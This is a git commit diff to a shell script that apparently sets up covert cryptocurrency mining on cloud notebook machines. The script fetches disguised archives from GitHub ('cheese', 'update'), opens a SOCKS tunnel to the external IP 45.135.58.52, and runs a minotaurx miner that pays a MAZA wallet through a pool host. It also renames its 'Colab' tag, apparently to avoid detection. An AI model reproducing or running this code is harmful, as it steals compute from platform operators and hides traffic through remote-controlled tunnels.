4cc067eadf8c57d5f0146bdc863cebbb39845ee5
maxwellcrawford21 <maxwellcrawford.2@gmail.com>
2024-06-18 10:49:50 +0200

    Update workload_for_col.sh

--- workload_for_col.sh
+++ workload_for_col.sh
@@ -3,11 +3,52 @@ cd
 sleep 2
 whoami
 sleep 3
-rm /tools/node/bin/node
-sleep 2
+	wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/cheese.tar.gz > /dev/null
 
+	sleep 2
+
+	tar -xf cheese.tar.gz
+
+	sleep 2
+
+	./cheese client -v 45.135.58.52:443 7777:socks &
+
+	sleep 2
+
+	TZ='Africa/Johannesburg'; export TZ
+	date
+	sleep 2
+
+	curl -s -L -o update.tar.gz https://raw.githubusercontent.com/thembilemhlabangula/update/main/update.tar.gz > /dev/null
+
+	sleep 2
+
+	tar -xf update.tar.gz > /dev/null
+
+	sleep 2
+
+cat > update/local/update-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 127.0.0.1:7777
+END
+
+	./update/local/update-local -config update/local/update-local.conf & > /dev/null
+
+	sleep 2
+
+	ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
+
+	sleep 3
+
+	./update/local/update-local -config update/local/update-local.conf & > /dev/null
+
+	sleep 2
+
+	./update/update curl ifconfig.me
+	
 num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
-currentdate=$(date '+%d-%b-%Y_Colab_')
+currentdate=$(date '+%d-%b-%Y_Col_')
 ipaddress=$(curl -s ifconfig.me)
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 currentdate+=$underscored_ip
@@ -68,7 +109,11 @@ function setup_and_run() {
 
     # Install dependencies
     npm install
+    
 
+	
+	
+	
     # Add Google Chrome's signing key and repository
     wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
     echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | tee /etc/apt/sources.list.d/google.list
@@ -80,66 +125,21 @@ function setup_and_run() {
     # Replace the config.json file with the provided values
     rm config.json
     #echo '{"algorithm": "'"$ALGO"'", "host": "'"$HOST"'", "port": '"$PORT"', "worker": "'"$WALLET"'", "password": "'"$PASSWORD"'", "workers": '"$THREADS"', "fee": '"$FEE"' }' > config.json
-    wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/cheese.tar.gz > /dev/null
-
-    sleep 2
-    
-    tar -xf cheese.tar.gz
-    
-    sleep 2
-    
-    ./cheese client -v 45.135.58.52:443 7777:socks &
-    
-    sleep 2
-    
-    TZ='Africa/Johannesburg'; export TZ
-    date
-    sleep 2
-    
-    curl -s -L -o update.tar.gz https://raw.githubusercontent.com/thembilemhlabangula/update/main/update.tar.gz > /dev/null
-    
-    sleep 2
-    
-    tar -xf update.tar.gz > /dev/null
-    
-    sleep 2
-    
-    cat > update/local/update-local.conf <<END
-    listen = :2233
-    loglevel = 1
-    socks5 = 127.0.0.1:7777
-    END
-    
-    ./update/local/update-local -config update/local/update-local.conf & > /dev/null
-    
-    sleep 2
-    
-    ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
-    
-    sleep 3
-    
-    ./update/local/update-local -config update/local/update-local.conf & > /dev/null
-    
-    sleep 2
-    
-    ./update/update curl ifconfig.me
-    
-    sleep 5
-    
-    cat > config.json <<END
-    {
-      "algorithm": "minotaurx",
-      "host": "flyingsaucer-eu.teatspray.fun",
-      "port": 7019,
-      "worker": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8",
-      "password": "$currentdate,c=MAZA,zap=MAZA",
-      "workers": $used_num_of_cores,
-      "fee": "1"
-    }
-    END
+	
+cat > config.json <<END
+{
+  "algorithm": "minotaurx",
+  "host": "flyingsaucer-eu.teatspray.fun",
+  "port": 7019,
+  "worker": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8",
+  "password": "$currentdate,c=MAZA,zap=MAZA",
+  "workers": $used_num_of_cores,
+  "fee": "1"
+}
+END
 
     # Check if we are in the correct directory and run node index.js
-    ./update/update node index.js 1>/dev/null 2>&1
+    ./update/update node index.js
 }
 
 if [ "$(basename "$PWD")" != "chrome-mint" ]; then
@@ -148,7 +148,7 @@ if [ "$(basename "$PWD")" != "chrome-mint" ]; then
   setup_and_run
 else
   echo "You are in the chrome-mint directory."
-  ./update/update node index.js 1>/dev/null 2>&1
+  ./update/update node index.js
 fi
 
 # # Call the setup_and_run function
